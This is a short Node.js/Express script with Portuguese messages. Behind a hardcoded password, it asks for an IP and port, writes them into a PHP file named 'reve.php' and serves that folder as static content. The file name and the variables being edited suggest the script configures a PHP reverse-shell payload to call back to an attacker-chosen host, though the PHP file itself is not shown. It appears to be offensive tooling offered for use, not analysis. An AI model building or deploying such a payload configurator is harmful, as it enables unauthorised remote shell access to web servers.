const express = require('express');
const readline = require('readline');
const path =  require('path');
const fs = require('fs');
const app = express();
const PORT = 9595;
const pass = "dreqxy"


const whmer = readline.createInterface({
    input: process.stdin,
    output: process.stdout
});

function askQuestion(query) {
    return new Promise(resolve => whmer.question(query, resolve));
  }

app.use(express.static(path.join( __dirname,'./server')));

app.get('/data/', (req, res) => {
  fs.readFile(path.join(__dirname, 'data', 'data.json'), 'utf8', (err, data) => {
      if (err) {
          res.status(500).send('Erro ao ler o arquivo de senha');
      } else {
          res.json(JSON.parse(data)); // Retorna o conteúdo do JSON para o cliente
      }
  });
});

app.listen(PORT, () =>{
console.log(`\n[+] PORT: ${PORT}\n\n`)
portS();
});

function portS(){
    whmer.question('[+] Try username: ', (input) =>{
        if(input == pass){
            console.log(`\n[-] User: ${input}`);
            updatePHPConfig();
        } else{
            console.log('[!] Erro');
            whmer.close();
        }
    })
} 
async function updatePHPConfig() {
    
    // Solicitar o IP e a porta ao usuário
    const ip = await askQuestion('[+] Try IP: ');
    const port = await askQuestion('[+] Try PORT: ');
    
    const filePath = './server/reve.php';

fs.readFile(filePath, 'utf8', (err, data) => {
    if (err) {
      console.error('Erro ao ler o arquivo PHP:', err);
      whmer.close();
      return;
    }

    // Modificar as variáveis IP e PORT
    let modifiedData = data.replace(/ip = '.*?';/, `ip = '${ip}';`);
    modifiedData = modifiedData.replace(/port = \d+;/, `port = ${port};`);

    fs.writeFile(filePath, modifiedData, 'utf8', (err) => {
        if (err) {
          console.error('Erro ao escrever no arquivo PHP:', err);
        } else {
          console.log('Configuração do PHP atualizada com sucesso!');
        }
       // rl.close();
      });
    });
  }